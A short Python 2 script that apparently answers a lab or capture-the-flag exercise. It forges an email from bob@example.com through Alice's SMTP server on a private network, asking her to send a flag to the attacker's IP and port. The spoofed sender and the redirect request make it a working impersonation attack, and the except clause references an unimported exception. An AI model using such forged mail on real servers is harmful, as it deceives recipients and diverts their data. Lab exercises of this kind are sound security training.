# Problem 9: Bob thinks that maybe he should get a new flag from Alice. He has a sneaking suspicion that the old one may have been compromised somehow. Forge an email to Alice from Bob (bob@example.com) by connecting to Alice's SMTP server at 192.168.14.48. The subject of your email should be "FLAG", and in the body it should say "GOTO (your IP) (your port)". Alice will connect via TCP to send you the new flag.

import smtplib

sender = 'bob@example.com'
receiver = ['alice']

try:
    message = 'From: bob@example.com\r\nSubject: FLAG\r\nGOTO 192.168.14.149 2020'
    smtp = smtplib.SMTP('192.168.14.48')
    smtp.sendmail(sender, receiver, message)
    print "sent email to alice"
except SMTPException:
    print "failed to send email to alice"
